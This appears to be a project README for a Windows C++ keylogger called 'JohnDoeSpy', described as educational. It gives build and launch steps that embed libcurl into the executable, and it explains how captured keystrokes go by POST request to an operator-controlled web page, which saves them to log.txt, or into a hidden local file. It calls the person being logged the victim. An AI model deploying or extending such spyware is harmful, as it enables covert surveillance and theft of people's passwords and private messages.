# JohnDoeSpy

# Introduction
<p> This is a simple keylogger for educational purposes. I'm . </p>
<p> Keylogger build in C++ for detect keys from keyboards (specific keys only available for french keyboard). You can receive data from url intermediate hosting or by simple text file hidden in your directory. </p>


# HAVE TO KNOW 

<p> This keylogger is build for french keyboard, by the way specific characters will appear with bad matching if you use an other country's keyboard. But any others characters show on <p/>

<p> WORK ONLY FOR WINDOWS </p>


## How to start

* Open terminal from root path project 
* <code> cd build\dllToExe </code>
* <code> pefrmdllembed.exe -impinj KeyloggerV1.exe libcurl-d.dll zlibd1.dll <NameKeylogger.exe> </code>
* Launch <NameKeylogger.exe>

## Configuration for hosting

* Intermediate hosting works with curl request and POST parameters. So you must have the same name parameter from your web hosting. By default it's "text".

* You have an example in web folder with index.php file. Copy paste or Write a script like that on your page which link your url.

* log.txt is the file where input text victim will be save.



### UPDATE COMMING SOON


